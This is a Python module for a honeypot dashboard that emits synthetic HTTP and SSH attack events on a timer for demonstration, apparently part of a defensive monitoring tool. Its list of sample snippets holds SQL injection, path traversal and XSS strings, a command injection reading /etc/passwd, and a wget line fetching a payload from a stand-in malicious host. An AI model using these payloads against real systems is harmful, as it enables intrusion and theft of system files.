"""
attack_simulator.py
----------------------
Generates realistic-looking (but entirely synthetic) honeypot events on
a background thread, at a random pace, so the dashboard can be
demonstrated, screenshotted, or developed against without ever exposing
a real port to the internet.

None of the IP addresses, credentials, or payloads here touch a real
network — they are just fed straight into the same EventBus the real
honeypots use.
"""

from __future__ import annotations
import random
import threading
import time

from app.capture.event_bus import HoneypotEvent, bus
from app.intel.signatures import BAIT_PATHS, COMMON_CREDENTIAL_PAIRS

_SUSPICIOUS_SNIPPETS = [
    "' OR '1'='1", "../../../../etc/passwd", "<script>alert(1)</script>",
    "UNION SELECT username,password FROM users", "; cat /etc/passwd;",
    "wget http://malicious.example/payload.sh", "",
]

_FAKE_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "Mozilla/5.0 (X11; Linux x86_64) zgrab/0.x",
    "Go-http-client/1.1",
]


def _random_public_ip() -> str:
    first = random.choice([r for r in range(1, 224) if r not in (10, 127)])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


class AttackSimulator:
    def __init__(self, min_interval: float = 0.4, max_interval: float = 2.2):
        self.min_interval = min_interval
        self.max_interval = max_interval
        self._running = False
        self._thread: threading.Thread | None = None
        # A handful of "repeat offender" IPs so the demo shows believable
        # scanning/credential-stuffing behavior building up over time.
        self._repeat_offenders = [_random_public_ip() for _ in range(3)]

    @property
    def is_running(self) -> bool:
        return self._running

    def _pick_ip(self) -> str:
        # 60% chance of reusing a repeat offender (so its BDI climbs over time)
        if random.random() < 0.6:
            return random.choice(self._repeat_offenders)
        return _random_public_ip()

    def _emit_http_event(self):
        ip = self._pick_ip()
        path = random.choice(BAIT_PATHS)
        snippet = random.choice(_SUSPICIOUS_SNIPPETS)
        bus.publish(HoneypotEvent(
            service="http", ip=ip, path=path, method=random.choice(["GET", "POST"]),
            raw_text=f"{path} {snippet}".strip(),
            user_agent=random.choice(_FAKE_USER_AGENTS),
        ))

    def _emit_ssh_event(self):
        ip = self._pick_ip()
        if random.random() < 0.7:
            username, password = random.choice(list(COMMON_CREDENTIAL_PAIRS))
        else:
            username = random.choice(["deploy", "git", "svc-backup", "jenkins"])
            password = f"pw{random.randint(100,999)}!"
        bus.publish(HoneypotEvent(
            service="ssh", ip=ip, username=username, password=password,
            raw_text=f"password-auth username={username} password={password}",
        ))

    def _loop(self):
        while self._running:
            if random.random() < 0.65:
                self._emit_http_event()
            else:
                self._emit_ssh_event()
            time.sleep(random.uniform(self.min_interval, self.max_interval))

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
